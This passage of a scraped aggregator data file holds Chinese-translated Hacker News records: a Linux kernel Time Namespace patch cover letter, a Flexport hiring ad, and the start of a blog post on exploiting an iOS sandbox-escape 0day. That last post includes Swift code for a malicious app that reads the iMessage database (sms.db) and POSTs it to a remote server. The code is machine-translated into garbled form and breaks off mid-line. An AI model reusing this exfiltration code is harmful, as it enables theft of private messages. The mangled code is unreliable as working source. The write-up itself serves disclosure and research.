139039824diff%|100|109.7|92.3-stdev%|0.08|0.1|0.3\u5728\u5b50\u547d\u540d\u7a7a\u95f4\u4e2d\uff0c\u6027\u80fd\u635f\u5931\u4e3a7-8%\u3002\u6839\u548c\u975e\u6839\u4e4b\u95f4\u7684\u8f83\u5927\u5dee\u5f02", "note_en": "/  color /  Atom feed From: Dmitry Safonov &lt;dima@arista.com&gt;To: linux-kernel@vger.kernel.orgCc: Dmitry Safonov &lt;0x7f454c46@gmail.com&gt;,\tDmitry Safonov &lt;dima@arista.com&gt;, Adrian Reber &lt;adrian@lisas.de&gt;,\tAndrei Vagin &lt;avagin@openvz.org&gt;,\tAndy Lutomirski &lt;luto@kernel.org&gt;, Arnd Bergmann &lt;arnd@arndb.de&gt;,\tChristian Brauner &lt;christian.brauner@ubuntu.com&gt;,\tCyrill Gorcunov &lt;gorcunov@openvz.org&gt;,\t&#34;Eric W. Biederman&#34; &lt;ebiederm@xmission.com&gt;,\t&#34;H. Peter Anvin&#34; &lt;hpa@zytor.com&gt;, Ingo Molnar &lt;mingo@redhat.com&gt;,\tJann Horn &lt;jannh@google.com&gt;, Jeff Dike &lt;jdike@addtoit.com&gt;,\tOleg Nesterov &lt;oleg@redhat.com&gt;,\tPavel Emelyanov &lt;xemul@virtuozzo.com&gt;,\tShuah Khan &lt;shuah@kernel.org&gt;,\tThomas Gleixner &lt;tglx@linutronix.de&gt;,\tVincenzo Frascino &lt;vincenzo.frascino@arm.com&gt;,\tcontainers@lists.linux-foundation.org, criu@openvz.org,\tlinux-api@vger.kernel.org, x86@kernel.orgSubject:  [PATCHv8 00/34] kernel: Introduce Time NamespaceDate: Tue, 12 Nov 2019 01:26:49 +0000Message-ID: &lt;20191112012724.250792-1-dima@arista.com&gt; ( raw)Discussions around time namespace are there for a long time. The firstattempt to implement it was in 2006 by Jeff Dike. From that time, thetopic appears on and off in various discussions.There are two main use cases for time namespaces:1. change date and time inside a container;2. adjust clocks for a container restored from a checkpoint.\u201cIt seems like this might be one of the last major obstacles keepingmigration from being used in production systems, given that not allcontainers and connections can be migrated as long as a time dependencyis capable of messing it up.\u201d (by github.com/dav-ell)The kernel provides access to several clocks: CLOCK_REALTIME,CLOCK_MONOTONIC, CLOCK_BOOTTIME. Last two clocks are monotonous, but thestart points for them are not defined and are different for eachsystem. When a container is migrated from one node to another, allclocks have to be restored into consistent states; in other words, theyhave to continue running from the same points where they have beendumped.The main idea of this patch set is adding per-namespace offsets forsystem clocks. When a process in a non-root time namespace requeststime of a clock, a namespace offset is added to the current value ofthis clock and the sum is returned.All offsets are placed on a separate page, this allows us to map it aspart of VVAR into user processes and use offsets from VDSO calls.Now offsets are implemented for CLOCK_MONOTONIC and CLOCK_BOOTTIMEclocks.v7..v8 Changes:* Fix compile-time errors: - on architectures without the support of time namespaces. - when CONFIG_POSIX_TIMERS isn&#39;t set.* Added checks in selftests for CONFIG_POSIX_TIMERS.* Inline do_hres and do_coarse. (And added Tested-by Vincenzo - thanks!)* Make TIME_NS depends on GENERIC_VDSO_TIME_NS and set it per-arch.[v1..v7 Changelogs is at the very bottom here]Our performance measurements show that the price of VDSO&#39;s clock_gettime()in a child time namespace is about 8% with a hot CPU cache and about 90%with a cold CPU cache. There is no performance regression for hostprocesses outside time namespace on those tests.We wrote two small benchmarks. The first one gettime_perf.c callsclock_gettime() in a loop for 3 seconds. It shows us performance witha hot CPU cache (more clock_gettime() cycles - the better):The first table shows performance of clock_gettime() in the root timenamespace.   | TIMENS=y-------------------------------------------   | 150363883 | 167076184 | 164979177   | 150616056 | 167348942 | 165202727   | 150679279 | 167235485 | 165230267   | 150622312 | 167078735 | 165284077   | 150706992 | 167301837 | 165372663   | 150563707 | 167207900 | 165395728-------------------------------------------avg | 150592038 | 167208180 | 165244106diff % | 100 | 111 | 109.7-------------------------------------------stdev % | 0.08 | 0.07 | 0.1We can see the 11% performance improvement when CONFIG_TIME_NS isdisabled. This is achieved by adding the unlikely hint intovdso_read_begin() and inlining do_hres() and do_coarse().When CONFIG_TIME_NS is enabled, there is one more clobbered register inthe __vdso_clock_gettime function. And this fact explains the performancedifference between the two right columns.The second table shows the performance of clock_gettime in a non-roottime namespace.   | before | host | inside timens----------------------------------------------   | 150363883 | 164979177 | 138133479   | 150616056 | 165202727 | 139047394   | 150679279 | 165230267 | 139284611   | 150622312 | 165284077 | 139263753   | 150706992 | 165372663 | 139175419   | 150563707 | 165395728 | 139334291----------------------------------------------avg | 150592038 | 165244106 | 139039824diff % | 100 | 109.7 | 92.3----------------------------------------------stdev % | 0.08 | 0.1 | 0.3In a sub-namespace, the performance hit is 7-8%. The bigger differencebetween root and non-root namespaces can be explained by the fact thatdo_{hres,coarse}_timens are not inlined. Inlining these functionsimproves performance in a sub-namespace, but there will be moreclobbered registers in __vdso_clock_gettime what will decrease theperformance in the root namespace.The gettime_perf_cold test does 10K iterations. In each iteration, itdrops cpu caches for vdso pages, clflush() is used for this, then it runsrdtsc(); clock_gettime; rdtsc(); and prints the number of tsc cycles.Cold CPU cache (lesser tsc per cycle - the better):   | inside timens--------------------------------------------------------------tsc | 476 | 480 | 487 | 531stdev(tsc) | 0.6 | 1.3 | 4.3 | 5.7diff (%) | 100 | 100.9 | 102 | 112vdsotest results:  https://gist.github.com/avagin/f290afb8b721ae0522a561d585f34de0The numbers gathered on Intel(R) Core(TM) i5-6300U CPU @ 2.40GHz.Cc: Adrian Reber &lt;adrian@lisas.de&gt;Cc: Andrei Vagin &lt;avagin@openvz.org&gt;Cc: Andy Lutomirski &lt;luto@kernel.org&gt;Cc: Arnd Bergmann &lt;arnd@arndb.de&gt;Cc: Christian Brauner &lt;christian.brauner@ubuntu.com&gt;Cc: Cyrill Gorcunov &lt;gorcunov@openvz.org&gt;Cc: Dmitry Safonov &lt;0x7f454c46@gmail.com&gt;Cc: &#34;Eric W. Biederman&#34; &lt;ebiederm@xmission.com&gt;Cc: &#34;H. Peter Anvin&#34; &lt;hpa@zytor.com&gt;Cc: Ingo Molnar &lt;mingo@redhat.com&gt;Cc: Jann Horn &lt;jannh@google.com&gt;Cc: Jeff Dike &lt;jdike@addtoit.com&gt;Cc: Oleg Nesterov &lt;oleg@redhat.com&gt;Cc: Pavel Emelyanov &lt;xemul@virtuozzo.com&gt;Cc: Shuah Khan &lt;shuah@kernel.org&gt;Cc: Thomas Gleixner &lt;tglx@linutronix.de&gt;Cc: Vincenzo Frascino &lt;vincenzo.frascino@arm.com&gt;Cc: containers@lists.linux-foundation.orgCc: criu@openvz.orgCc: linux-api@vger.kernel.orgCc: x86@kernel.orgv8 on github (if someone prefers `git pull` to `git am`): https://github.com/0x7f454c46/linux/tree/timens-v8v7:  https://lkml.kernel.org/r/20191011012341.846266-1-dima@arista.comv6:  https://lkml.kernel.org/r/20190815163836.2927-1-dima@arista.comv5:  https://lkml.kernel.org/r/20190729215758.28405-1-dima@arista.comv4:  https://lkml.kernel.org/r/20190612192628.23797-1-dima@arista.comv3:  https://lkml.kernel.org/r/20190425161416.26600-1-dima@arista.comv2:  https://lore.kernel.org/lkml/20190206001107.16488-1-dima@arista.com/RFC:  https://lkml.kernel.org/r/20180919205037.9574-1-dima@arista.com/v6..v7 Changes:* Based on Andy &amp; Thomas suggestions and the patches that Thomas kindely sent, reworked from two VDSO code images into trick with odd seq number for timens page that goes on the place of vvar page inside ns.* Moved kernel/time_namespace.c =&gt; kernel/time/namespace.c* Fixed bpf 5sec example* Added selftests outputs* By Thomas&#39;s suggestion simplified overflow check as ktime_sub(tim, offset)* Other Thomas&#39;s review notes: stylistic, simplifications and clearifications (Thanks!)* Split VDSO patches on generic/x86 parts* Fixed kernel-doc warnings* Added checks in selftests for capabilities* Fixed bisectability issuesv5..v6 Changes:* Used current_is_single_threaded() instead of thread_group_empty() (Thanks for the review, Andy).* Changed errno code when there are threads on timens joining to something more grepabble (EUSERS).* posix_get_timespec() should have been posix_get_monotonic_timespec() (Thanks, Thomas)* timens_add_monotonic() &amp; timens_add_boottime() were relocated to the patch that introduces (struct timens_offsets) (Thomas)* Avoid breaking alarmtimer for ALARM_REALTIME (Thanks, Thomas)* Nested namespace inherits father&#39;s offsets now (Andrei while working on CRIU side for time namespace)* A minor conflict with commit dbc1625fc9de (&#34;hrtimer: Consolidate hrtimer_init() + hrtimer_init_sleeper() calls&#34;) in linux-next [Sending against next-20190814]v4..v5 Changes:* Rebased over generic vdso (already in master)* Addressing review comments by Thomas Gleixner (thanks much for your time and patience): - Dropping `timens` prefix from subjects (it&#39;s not a subsystem) - Keeping commit messages in a neutral technical form - Splitting unreasonably large patches - Document code with missing comments - Dropped dead code that&#39;s not compiled with !CONFIG_TIME_NS* Updated performance results [here, at the bottom]* Split vdso jump tables patch* Allow unshare() with many threads: it&#39;s safe until fork()/clone(), where we check for CLONE_THREADS* Add missed check in setns() for CLONE_VM | CLONE_THREADS* Fixed compilation with !CONFIG_UTS_NS* Add a plan in selftests (prevents new warning &#34;Planned tests != run tests&#34;)* Set jump table section address &amp; size to (-1UL) just in case if there is no such section while running vdso2c (and WARN() on boot in such case)v3..v4 Changes:* CLOCKE_NEWTIME is unshare()-only flag now (CLON_PIDFD took previous value)* Addressing Jann Horn&#39;s feedback - we don&#39;t allow CLONE_THREAD or CLONE_VM together with CLONE_NEWTIME (thanks for spotting!)* Addressing issues found by Thomas - removed unmaintainable CLOCK_TIMENS and introduced another call back into k_clock to get ktime instead of getting timespec and converting it (Patch 03)* Renaming timens_offsets members to omit _offset postfix (thanks Cyrill for the suggestion)* Suggestions, renaming and making code more maintainable from Thomas&#39;s feedback (thanks much!)* Fixing out-of-bounds and other issues in procfs file (kudos Jann Horn)* vdso_fault() can be called on a remote task by /proc/$pid/mem or process_vm_readv() - addressed by adding a slow-path with searching for owner&#39;s namespace (thanks for spotting this unobvious issue, Jann)* Other nits by Jann Hornv2..v3: Major changes:* Simplify two VDSO images by using static_branch() in vclock_gettime() Removes unwanted conflicts with generic VDSO movement patches and simplifies things by dropping too invasive linker magic. As an alternative to static_branch() we tested an attempt to introduce home-made dynamic patching called retcalls:  https://github.com/0x7f454c46/linux/commit/4cc0180f6d65 Considering some theoretical problems with toolchains, we decided to go with long well-tested nop-patching in static_branch(). Though, it was needed to provide backend for relative code.* address Thomas&#39; comments.* add sanity checks for offsets: - the current clock time in a namespace has to be in [0, KTIME_MAX / 2). KTIME_MAX is divided by two here to be sure that the KTIME_MAX limit is still unreachable.Link:  https://lkml.org/lkml/2018/9/19/950Link:  https://lkml.org/lkml/2019/2/5/867v1..v2: There are two major changes:* Two versions of the VDSO library to avoid a performance penalty for host tasks outside time namespace (as suggested by Andy and Thomas). As it has been discussed on timens RFC, adding a new conditional branch `if (inside_time_ns)` on VDSO for all processes is undesirable. It will add a penalty for everybody as branch predictor may mispredict the jump. Also there are instruction cache lines wasted on cmp/jmp. Those effects of introducing time namespace are very much unwanted having in mind how much work have been spent on micro-optimisation VDSO code. Addressing those problems, there are two versions of VDSO&#39;s .so: for host tasks (without any penalty) and for processes inside of time namespace with clk_to_ns() that subtracts offsets from host&#39;s time.* Allow to set clock offsets for a namespace only before any processes appear in it. Now a time namespace looks similar to a pid namespace in a way how it is created: unshare(CLONE_NEWTIME) system call creates a new time namespace, but doesn&#39;t set it to the current process. Then all children of the process will be born in the new time namespace, or a process can use the setns() system call to join a namespace. This scheme allows to create a new time namespaces, set clock offsets and then populate the namespace with processes.Andrei Vagin (23): lib/vdso: Add unlikely() hint into vdso_read_begin() lib/vdso: make do_hres and do_coarse as __always_inline ns: Introduce Time Namespace time: Add timens_offsets to be used for tasks in timens posix-clocks: Rename the clock_get() callback to clock_get_timespec() posix-clocks: Rename .clock_get_timespec() callbacks accordingly alarmtimer: Rename gettime() callback to get_ktime() alarmtimer: Provide get_timespec() callback posix-clocks: Introduce clock_get_ktime() callback posix-timers: Use clock_get_ktime() in common_timer_get() posix-clocks: Wire up clock_gettime() with timens offsets kernel: Add do_timens_ktime_to_host() helper timerfd: Make timerfd_settime() time namespace aware posix-timers: Make timer_settime() time namespace aware alarmtimer: Make nanosleep time namespace aware hrtimers: Prepare hrtimer_nanosleep() for time namespaces posix-timers: Make clock_nanosleep() time namespace aware fs/proc: Introduce /proc/pid/timens_offsets selftests/timens: Add a test for timerfd selftests/timens: Add a test for clock_nanosleep() selftests/timens: Add timer offsets test selftests/timens: Add a simple perf test for clock_gettime() selftests/timens: Check for right timens offsets after fork and execDmitry Safonov (10): fs/proc: Respect boottime inside time namespace for /proc/uptime x86/vdso: Restrict splitting VVAR VMA x86/vdso: Provide vdso_data offset on vvar_page x86/vdso: Add timens page time: Allocate per-timens vvar page x86/vdso: Handle faults on timens page x86/vdso: On timens page fault prefault also VVAR page x86/vdso: Zap vvar pages on switch a time namspace selftests/timens: Add Time Namespace test for supported clocks selftests/timens: Add procfs selftestThomas Gleixner (1): lib/vdso: Prepare for time namespace support  MAINTAINERS | 2 +  arch/x86/Kconfig | 1 +  arch/x86/entry/vdso/vdso-layout.lds.S | 13 +-  arch/x86/entry/vdso/vdso2c.c | 3 +  arch/x86/entry/vdso/vma.c | 119 ++++-  arch/x86/include/asm/vdso.h | 1 +   | 9 +  arch/x86/include/asm/vvar.h | 13 +-  arch/x86/kernel/vmlinux.lds.S | 4 +-  fs/proc/base.c | 95 ++++   | 4 +   | 3 +   | 3 +   | 2 +-  include/linux/nsproxy.h | 2 +  include/linux/proc_ns.h | 3 +   | 6 +   | 128 +++++   | 1 +  include/uapi/linux/sched.h | 6 +  include/vdso/datapage.h | 19 +-  include/vdso/helpers.h | 2 +-  init/Kconfig | 8 +  kernel/fork.c | 16 +-  kernel/nsproxy.c | 41 +-   | 1 +   | 73 ++-   | 8 +-   | 466 ++++++++++++++++++   | 8 +-   | 32 +-   | 15 +-   | 88 +++-   | 7 +-  lib/vdso/Kconfig | 6 +   | 164 +++++-  mm/mmap.c | 2 +  tools/perf/examples/bpf/5sec.c | 6 +-  tools/testing/selftests/Makefile | 1 +   | 8 +   | 7 +   | 150 ++++++   | 1 +   | 94 ++++   | 95 ++++   | 26 +   | 144 ++++++   | 190 +++++++   | 100 ++++   | 123 +++++   | 129 +++++ 51 files changed, 2337 insertions(+), 111 deletions(-) create mode 100644 include/linux/time_namespace.h create mode 100644 kernel/time/namespace.c create mode 100644 tools/testing/selftests/timens/.gitignore create mode 100644 tools/testing/selftests/timens/Makefile create mode 100644 tools/testing/selftests/timens/clock_nanosleep.c create mode 100644 tools/testing/selftests/timens/config create mode 100644 tools/testing/selftests/timens/exec.c create mode 100644 tools/testing/selftests/timens/gettime_perf.c create mode 100644 tools/testing/selftests/timens/log.h create mode 100644 tools/testing/selftests/timens/procfs.c create mode 100644 tools/testing/selftests/timens/timens.c create mode 100644 tools/testing/selftests/timens/timens.h create mode 100644 tools/testing/selftests/timens/timer.c create mode 100644 tools/testing/selftests/timens/timerfd.c-- 2.24.0    reply  index Thread overview: 56+ messages / expand[ flat| nested]  mbox.gz  Atom feed  top 2019-11-12 1:26  Dmitry Safonov [this message]2019-11-12 1:26 `  [PATCHv8 01/34] lib/vdso: Add unlikely() hint into vdso_read_begin() Dmitry Safonov2019-11-12 1:26 `  [PATCHv8 02/34] lib/vdso: make do_hres and do_coarse as __always_inline Dmitry Safonov [not found] ` &lt; 20191112012724.250792-3-dima-nzgTgzXrdUbQT0dZR+AlfA@public.gmane.org&gt;2020-01-10 9:45 `  Vincenzo Frascino2020-01-10 11:42 `  Thomas Gleixner [not found] ` &lt; 878smfa66i.fsf-ecDvlHI5BZPZikZi3RtOZ1XZhhPuCNm+@public.gmane.org&gt;2020-01-10 11:47 `  Vincenzo Frascino2020-01-10 12:02 `  Thomas Gleixner [not found] ` &lt; 875zhja59q.fsf-ecDvlHI5BZPZikZi3RtOZ1XZhhPuCNm+@public.gmane.org&gt;2020-01-10 12:18 `  Vincenzo Frascino2020-01-13 5:27 `  Andrei Vagin2019-11-12 1:26 `  [PATCHv8 03/34] ns: Introduce Time Namespace Dmitry Safonov [not found] ` &lt; 20191112012724.250792-4-dima-nzgTgzXrdUbQT0dZR+AlfA@public.gmane.org&gt;2020-01-27 14:12 `  Dmitry Vyukov [not found] ` &lt; CACT4Y+b70bRRS2XD3yxhBoy4E-LFy_K3wMrjeuPmiEvaPe_c2Q-JsoAwUIsXosN+BqQ9rBEUg@public.gmane.org&gt;2020-01-27 14:19 `  Dmitry Safonov2020-02-17 14:20 `  Time Namespaces: CLONE_NEWTIME and clone3()? Michael Kerrisk2020-02-17 14:59 `  Christian Brauner2020-02-17 21:47 `  Michael Kerrisk (man-pages)2020-02-17 23:03 `  Christian Brauner2020-02-17 23:29 `  Thomas Gleixner2020-02-18 2:37 `  Eric W. Biederman2020-02-18 17:11 `  Adrian Reber2020-02-18 17:26 `  Christian Brauner2019-11-12 1:26 `  [PATCHv8 04/34] time: Add timens_offsets to be used for tasks in timens Dmitry Safonov2019-11-12 1:26 `  [PATCHv8 05/34] posix-clocks: Rename the clock_get() callback to clock_get_timespec() Dmitry Safonov2019-11-12 1:26 `  [PATCHv8 06/34] posix-clocks: Rename .clock_get_timespec() callbacks accordingly Dmitry Safonov2019-11-12 1:26 `  [PATCHv8 07/34] alarmtimer: Rename gettime() callback to get_ktime() Dmitry Safonov2019-11-12 1:26 `  [PATCHv8 08/34] alarmtimer: Provide get_timespec() callback Dmitry Safonov2019-11-12 1:26 `  [PATCHv8 09/34] posix-clocks: Introduce clock_get_ktime() callback Dmitry Safonov2019-11-12 1:26 `  [PATCHv8 10/34] posix-timers: Use clock_get_ktime() in common_timer_get() Dmitry Safonov2019-11-12 1:27 `  [PATCHv8 11/34] posix-clocks: Wire up clock_gettime() with timens offsets Dmitry Safonov2019-11-12 1:27 `  [PATCHv8 12/34] kernel: Add do_timens_ktime_to_host() helper Dmitry Safonov2019-11-12 1:27 `  [PATCHv8 13/34] timerfd: Make timerfd_settime() time namespace aware Dmitry Safonov2019-11-12 1:27 `  [PATCHv8 14/34] posix-timers: Make timer_settime() &#34; Dmitry Safonov2019-11-12 1:27 `  [PATCHv8 15/34] alarmtimer: Make nanosleep &#34; Dmitry Safonov2019-11-12 1:27 `  [PATCHv8 16/34] hrtimers: Prepare hrtimer_nanosleep() for time namespaces Dmitry Safonov2019-11-12 1:27 `  [PATCHv8 17/34] posix-timers: Make clock_nanosleep() time namespace aware Dmitry Safonov2019-11-12 1:27 `  [PATCHv8 18/34] fs/proc: Respect boottime inside time namespace for /proc/uptime Dmitry Safonov2019-11-12 1:27 `  [PATCHv8 19/34] x86/vdso: Restrict splitting VVAR VMA Dmitry Safonov2019-11-12 1:27 `  [PATCHv8 20/34] lib/vdso: Prepare for time namespace support Dmitry Safonov [not found] ` &lt; 20191112012724.250792-21-dima-nzgTgzXrdUbQT0dZR+AlfA@public.gmane.org&gt;2020-01-12 10:32 `  Thomas Gleixner2019-11-12 1:27 `  [PATCHv8 21/34] x86/vdso: Provide vdso_data offset on vvar_page Dmitry Safonov2019-11-12 1:27 `  [PATCHv8 22/34] x86/vdso: Add timens page Dmitry Safonov\n......", "posttime": "2020-05-05 11:18:19", "tags": "\u547d\u540d,\u6027\u80fd,vdso", "title": "\u65f6\u95f4\u547d\u540d\u7a7a\u95f4\u7b80\u4ecb(2019)", "title_en": "Introduce Time Namespace (2019)", "transed": 1, "url": "https://lore.kernel.org/linux-api/20191112012724.250792-1-dima@arista.com/", "via": "", "source_name": "Hacker News", "source_domain": "news.ycombinator.com", "real_tags": ["\u547d\u540d", "\u6027\u80fd", "vdso"]}, {"category": "", "categoryclass": "", "imagename": "d4923d230d10a14be6c66b3c3d6d7000.png", "infoid": 1000691, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u5728\u8d38\u6613\u548c\u4e92\u8054\u7f51\u7684\u4ea4\u6c47\u70b9\uff0cFlexport\u5de5\u7a0b\u6b63\u5728\u98a0\u8986\u5386\u53f2\u60a0\u4e45\u7684\u8d27\u8fd0\u4ee3\u7406\u884c\u4e1a\u3002\u6211\u4eec\u6b63\u5728\u5bfb\u627e\u521b\u65b0\u7684\u3001\u5145\u6ee1\u6fc0\u60c5\u7684\u4eba\u6765\u6784\u5efa\u6570\u5b57\u6280\u672f\uff0c\u4f7f\u4e16\u754c\u5404\u5730\u7684\u8fd0\u8f93\u53d8\u5f97\u66f4\u5bb9\u6613\u3001\u66f4\u9ad8\u6548\u3002\n\u6211\u4eec\u6b63\u5728\u6539\u53d8\u4eba\u4eec\u5bf9\u8d27\u8fd0\u7684\u770b\u6cd5\u3002\u80fd\u6210\u4e3a\u89e3\u51b3\u96be\u9898\u7684\u5f00\u62d3\u8005\u662f\u4ee4\u4eba\u5174\u594b\u7684\u3002\n\u6211\u4eec\u7684\u5de5\u7a0b\u5e08\u6b63\u5728\u63a5\u53d7\u5de8\u5927\u800c\u72ec\u7279\u7684\u6311\u6218\uff1a\u9996\u5148\uff0c\u6211\u4eec\u7684\u56e2\u961f\u6b63\u5728\u521b\u5efa\u4e00\u4e2a\u6570\u636e\u6a21\u578b\uff0c\u8be5\u6a21\u578b\u4ee5\u4e00\u79cd\u771f\u5b9e\u7684\u3001\u6613\u4e8e\u7406\u89e3\u548c\u8bbf\u95ee\u7684\u65b9\u5f0f\u8868\u793a\u7269\u6d41\u7684\u6240\u6709\u590d\u6742\u6027\u3002\u6b64\u5916\uff0c\u6211\u4eec\u7684\u5ba2\u6237\u548c\u6211\u4eec\u652f\u6301\u7684\u4f9b\u5e94\u94fe\u90fd\u662f\u5168\u7403\u6027\u7684\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u4e0d\u4f1a\u5c0f\u89c4\u6a21\u63a8\u51fa\u6211\u4eec\u7684\u4ea7\u54c1-\u5b83\u4eec\u7acb\u5373\u4e3a\u6211\u4eec\u5728\u4e16\u754c\u5404\u5730\u5408\u4f5c\u7684\u4f01\u4e1a\u8fd0\u8425\u3002\nFlexport\u7684\u53d1\u5c55\u975e\u5e38\u8fc5\u901f\uff0c\u6211\u4eec\u7684\u4ea7\u54c1\u4e5f\u662f\u5982\u6b64--\u6211\u4eec\u6b22\u8fce\u63d0\u95ee\u548c\u72ec\u7279\u7684\u60f3\u6cd5\u3002\u6211\u4eec\u7684\u5de5\u7a0b\u5e08\u6709\u6743\u8bc6\u522b\u5173\u952e\u9879\u76ee\uff0c\u5bf9\u5b83\u4eec\u8fdb\u884c\u6218\u7565\u4f18\u5148\u6392\u5e8f\uff0c\u5e76\u6267\u884c\u5b83\u4eec\u3002\u4f60\u51b3\u5b9a\u600e\u4e48\u5e26\u6211\u4eec\u53bb\u6211\u4eec\u60f3\u53bb\u7684\u5730\u65b9\u3002\u4f60\u5bf9\u8d27\u8fd0\u4ee3\u7406\u77e5\u4e4b\u751a\u5c11\u5417\uff1f\u5927\u591a\u6570\u5de5\u7a0b\u5e08\u5728\u5f00\u59cb\u5de5\u4f5c\u65f6\u4e5f\u4e0d\u4f1a\u8fd9\u6837\u505a\uff0c\u4f46\u60a8\u5c06\u901a\u8fc7\u4e0e\u56e2\u961f\u534f\u4f5c\u548c\u5b66\u4e60\u6765\u53d1\u5c55\u4e13\u4e1a\u77e5\u8bc6\u3002\u53e6\u5916\uff0c\u56e0\u4e3a\u6211\u4eec\u7684\u5f88\u591a\u8f6f\u4ef6\u90fd\u662f\u4e3a\u5185\u90e8\u8fd0\u8425\u56e2\u961f\u8bbe\u8ba1\u7684\uff0c\u6240\u4ee5\u60a8\u7ecf\u5e38\u53ef\u4ee5\u76f4\u63a5\u4e0e\u60a8\u7684\u7528\u6237\u4e00\u8d77\u5de5\u4f5c\uff01\n\u6606\u5ef7\u00b7\u6881(Quintin Leong)\u662fFlexport\u9884\u8ba2\u56e2\u961f\u7684\u8f6f\u4ef6\u5de5\u7a0b\u5e08\uff0c\u4ed6\u5206\u4eab\u4e86\u52a0\u5165Flexport\u7684\u539f\u56e0\u3001\u4ed6\u7684\u56e2\u961f\u7684\u4f7f\u547d\u662f\u4ec0\u4e48\uff0c\u4ee5\u53ca\u5b83\u4e3a\u4ec0\u4e48\u91cd\u8981\u3002", "note_en": "At the intersection of trade and the internet, Flexport engineering is disrupting the age-old freight forwarding industry. We&#39;re looking for innovative, passionate people to build the digital technologies that will make shipping around the world easier and more efficient.\n We&#39;re changing how people think about moving freight. It&#39;s exciting to be a pioneer, solving the hard problems.\n Our engineers are taking on huge and unique challenges: to start with, our teams are creating a data model that represents all the complexities of logistics in a way that\u2019s true to reality, yet easy to understand and access. Plus, our clients and the supply chains we support are global. So we don\u2019t roll out our products on a small scale \u2013 they\u2019re operating for the businesses we partner with around the world right away.\n Flexport is growing very quickly, and so is our product -- we welcome questions and unique ideas. Our engineers are empowered to identify critical projects, strategically prioritize them, and execute them. You decide how to get us to where we want to go.Don\u2019t know much about freight forwarding? Neither do most engineers when they start, but you\u2019ll develop expertise by collaborating and learning with your team. Plus, because so much of our software is for our internal operations teams, you\u2019ll often get to work directly with your users!\n   Quintin Leong, a software engineer on the bookings team at Flexport, shares why he joined Flexport, what his team\u2019s mission is, and why it matters.", "posttime": "2020-05-05 11:18:15", "tags": "\u8f6f\u4ef6\u5de5\u7a0b\u5e08,\u8f6f\u4ef6,hiring,\u56e2\u961f,flexport", "title": "Flexport\u6b63\u5728\u963f\u59c6\u65af\u7279\u4e39\u62db\u8058\u8f6f\u4ef6\u5de5\u7a0b\u5e08(\u6211\u4eec\u53ef\u4ee5\u4e3a\u60a8\u529e\u7406\u7b7e\u8bc1)", "title_en": "Flexport is hiring software engineers in Amsterdam (we can get you a visa)", "transed": 1, "url": "https://www.flexport.com/careers/department/engineering", "via": "", "source_name": "Hacker News", "source_domain": "news.ycombinator.com", "real_tags": ["\u8f6f\u4ef6\u5de5\u7a0b\u5e08", "\u8f6f\u4ef6", "hiring", "\u56e2\u961f", "flexport"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1000690, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u8fd9\u662f\u4e00\u4e2a\u7279\u522b\u7684\u5e16\u5b50\uff0c\u56e0\u4e3a\u6211\u5b8c\u5168\u57fa\u4e8e\u53e6\u4e00\u4f4d\u7814\u7a76\u4eba\u5458\uff0cs1guza\u76840day\u3002\u6240\u6709\u7684\u6545\u4e8b\u90fd\u662f\u4ece\u4e0b\u9762\u7684\u63a8\u7279\u5f00\u59cb\u7684\uff1aSiguza\u544a\u8bc9\u6211\u4eec\uff0c\u4ed6\u76840day\u5728iOS13.5Beta3\u4e2d\u6253\u4e86\u8865\u4e01\u3002\u56e0\u6b64\uff0c\u5bf9\u4e8e\u6700\u65b0\u7684\u975e\u6d4b\u8bd5\u7248iOS(13.4.1)\u6765\u8bf4\uff0c\u8fd9\u5b9e\u9645\u4e0a\u662f\u4e00\u6b21\u6c99\u76d2\u9003\u8131\u3002\u5728\u8fd9\u7bc7\u6587\u7ae0\u4e2d\uff0c\u6211\u5c06\u5411\u60a8\u5c55\u793a\u6211\u5982\u4f55\u590d\u5236\u8be5\u9519\u8bef\u5e76\u7f16\u5199\u6076\u610f\u5e94\u7528\u7a0b\u5e8f\uff0c\u5229\u75280day\u7a83\u53d6iMessage\u5386\u53f2\u8bb0\u5f55\uff01\ud83d\ude31\u6211\u4e0d\u4f1a\u8be6\u7ec6\u89e3\u91ca\u6b64\u9519\u8bef\uff0c\u56e0\u4e3aS1guza\u8ba1\u5212\u64b0\u5199\u4e00\u7bc7\u5173\u4e8e\u6b64\u9519\u8bef\u7684\u6587\u7ae0\u3002\u5f53\u4ed6\u8fd9\u6837\u505a\u7684\u65f6\u5019\uff0c\u6211\u4f1a\u66f4\u65b0\u8fd9\u7bc7\u5e16\u5b50\u3002\u66f4\u65b0\uff1ahttps://siguza.github.io/psychicpaper/\u6211\u521b\u5efa\u4e86\u4e00\u4e2a\u7b80\u5355\u7684SWIFT\u5e94\u7528\u7a0b\u5e8f\uff0c\u5176\u4e2d\u5305\u542b\u4ee5\u4e0b\u4ee3\u7801\uff1aimport SwiftUI struct ContentView\uff1aView{@State var serverURLString\uff1aString=&#34\uff1b&#34\uff1bvar Body\uff1aSome View{vStack(){Text(&#34\uff1b&#34\uff1b&#34\uff1biMessage DB\u57fa\u4e8e@s1guza&#39\uff1b\u7684tweet\\n\u7531@_r3ggi&34\uff1b&#34\uff1b&\u3002).multilineTextAlignment(.center)TextField(&#34\uff1b\u670d\u52a1\u5668URL&#34\uff1b\uff0c\u6587\u672c\uff1a$serverURLString).PADDING(.all\uff0c40).textFieldStyle(RoundedBorderTextFieldStyle())\u6309\u94ae(\u64cd\u4f5c\uff1a{sendPostData(serverURLString\uff1aself.serverURLString)}){Text(&#34\uff1b\u53d1\u9001\u60a8\u7684sms.db\uff01&#34\uff1b)}func sendPostData(serverURLString\uff1aString){let messagesPath=&#34\uff1b/private/var/mobile/Library/SMS/sms.db&#34\uff1b\u8ba9messagesURL=URL(fileURLWithPath\uff1amessagesPath)let serverURL=URL(String\uff1aserverURLString)var request=URLRequest(url\uff1aserverURL\uff01)\u3002request.httpMethod=&#34\uff1bpost&#34\uff1bdo{if filemanager\u3002init().isReadableFile(atPath\uff1amessagesPath){let rawMessagesDB=try data(contentsOf\uff1amessagesURL)request.httpBody=rawMessagesDB}Else{request.httpBody=&#34\uff1bNO&#34\uff1b.Data(Using\uff1a.utf8)}}catch{}let 